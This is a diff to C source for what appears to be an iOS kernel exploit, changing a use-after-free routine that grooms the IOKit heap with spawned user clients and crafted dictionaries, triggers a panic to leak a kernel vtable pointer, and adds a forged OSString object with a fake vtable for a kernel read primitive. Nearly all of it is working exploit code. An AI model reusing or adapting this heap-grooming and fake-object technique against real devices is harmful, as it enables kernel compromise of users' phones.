@@ -1,70 +1,77 @@
 #include <stdint.h>             // uint32_t
-#include <unistd.h>             // usleep, sync
+#include <sys/sysctl.h>         // CTL_*, KERN_OSVERSION, HW_MODEL, sysctl
+#include <unistd.h>             // sleep, usleep, sync
 
 #include <IOKit/IOKitLib.h>     // IO*, io_*
 
 #include "common.h"             // DEBUG
 #include "io.h"                 // kOS*, dict_parse, _io_*
+#include "slide.h"              // get_kernel_anchor
 #include "try.h"                // THROW, TRY, RETHROW
 
 #include "uaf_panic.h"
+
+static void print_info(void)
+{
+    // Neat info
+    addr_t anchor = get_kernel_anchor();
+    char b[32];
+    size_t s;
+    int cmd[2];
+    DEBUG("************** Info **************");
+    DEBUG("* To go along with the panic log *");
+    s = sizeof(b);
+    cmd[0] = CTL_HW;
+    cmd[1] = HW_MODEL;
+    if(sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0) == 0)
+    {
+        DEBUG("* Model: %-23s *", b);
+    }
+    s = sizeof(b);
+
+    cmd[0] = CTL_KERN;
+    cmd[1] = KERN_OSVERSION;
+    if(sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0) == 0)
+    {
+        DEBUG("* OS build: %-20s *", b);
+    }
+    DEBUG("* Anchor: " ADDR
+#ifdef __LP64__
+        "    "
+#else
+        "            "
+#endif
+        " *", anchor);
+    DEBUG("**********************************");
+}
+
+void uaf_panic_read(addr_t addr)
+{
+    addr_t vtab[5] =
+    {
+        0x0,
+        0x0,
+        0x0,
+        0x0,
+        addr,
+    };
+    OSString osstr =
+    {
+        .vtab = (vtab_t)vtab,
+        .retainCount = 100,
+        .flags = kOSStringNoCopy,
+        .length = 0,
+        .string = NULL,
+    };
+}
 
 #define NUMSTR_PLUG 255
 #define NUMSTR_PAD   64
 #define NUM_CLIENTS  16
 
-#if 0
-static const char *services[] =
-{
-    //"ASP",
-    //"AppleAVE",
-    //"AppleBCMWLAN",
-    "AppleBaseband",
-    "AppleCredentialManager",
-    "AppleEffaceableStorage",
-    "AppleJPEGDriver",
-    "AppleKeyStore",
-    "AppleMobileFileIntegrity",
-    //"AppleNANDFTL",
-    "AppleSPUHIDDriver",
-    //"AppleSRSDriver",
-    "AppleSSE",
-    "AppleStockholmControl",
-    //"AppleUSBHostInterface",
-    "IOAESAccelerator",
-    //"IOAVAudioInterface",
-    //"IOAVController",
-    //"IOAVDevice",
-    //"IOAVService",
-    //"IOAVVideoInterface",
-    //"IOAccelShared",
-    "IOAccessoryManager",
-    "IOAudioCodecs",
-    //"IODPAudioInterface",
-    //"IODPController",
-    //"IODPDevice",
-    //"IODPDisplayInterface",
-    //"IODPService",
-    //"IOHIDLib",
-    //"IOHIDResourceDevice",
-    "IOMobileFramebuffer",
-    //"IOReport",
-    //"IOStreamAudio",
-    "IOSurfaceRoot",
-    "IOUSBDeviceInterface",
-    "IOUserEthernetResource",
-    "ProvInfoIOKit",
-    //"RootDomain",
-    "com_apple_audio_IOBorealisOwl",
-    "com_apple_driver_FairPlayIOKit",
-    //"mDNSOffload",
-    //"wlDNSOffload",
-};
-#endif
-
 void uaf_panic_leak_vtab(void)
 {
-    DEBUG("Using UAF to (panic-)leak vtable...");
+    DEBUG("Using UAF to leak vtable...");
 
     const char str[4] = "str";
     uint32_t
@@ -129,23 +136,22 @@ void uaf_panic_leak_vtab(void)
     PRINT_BUF("dict_pad ", dict_pad,  sizeof(dict));
 
     DEBUG("Spawning user clients...");
-    io_service_t service = _io_get_service();
     io_connect_t client_plug,
                  client_hole[NUM_CLIENTS],
                  client_pad [NUM_CLIENTS];
 
     DEBUG("Plugging existing heap holes...");
-    client_plug = _io_spawn_client(service, dict_plug, sizeof(dict_plug));
+    client_plug = _io_spawn_client(dict_plug, sizeof(dict_plug));
 
     DEBUG("Allocating (hopefully) contiguous memory...");
     for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
     {
         TRY
         ({
-            client_hole[i] = _io_spawn_client(service, dict_hole, sizeof(dict_hole));
+            client_hole[i] = _io_spawn_client(dict_hole, sizeof(dict_hole));
             TRY
             ({
-                client_pad[i] = _io_spawn_client(service, dict_pad , sizeof(dict_pad));
+                client_pad[i] = _io_spawn_client(dict_pad , sizeof(dict_pad));
             })
             RETHROW
             ({
@@ -171,11 +177,13 @@ void uaf_panic_leak_vtab(void)
             _io_release_client(client_hole[i]);
         }
 
-        DEBUG("Fire in the hole! (This should panic.)");
+        print_info();
+
+        DEBUG("Triggering panic!");
         // Write everything to disk
         sync();
-        // Async cleanup & allow SSH to deliver latest output
-        usleep(10000);
+        // Async cleanup & allow SSH/syslog to deliver latest output
+        sleep(3);
 
         dict_parse(dict, sizeof(dict));
         DEBUG("...shit, we're still here.");
@@ -188,5 +196,4 @@ void uaf_panic_leak_vtab(void)
         }
         _io_release_client(client_plug);
     })
-    usleep(10000); // Async cleanup
 }
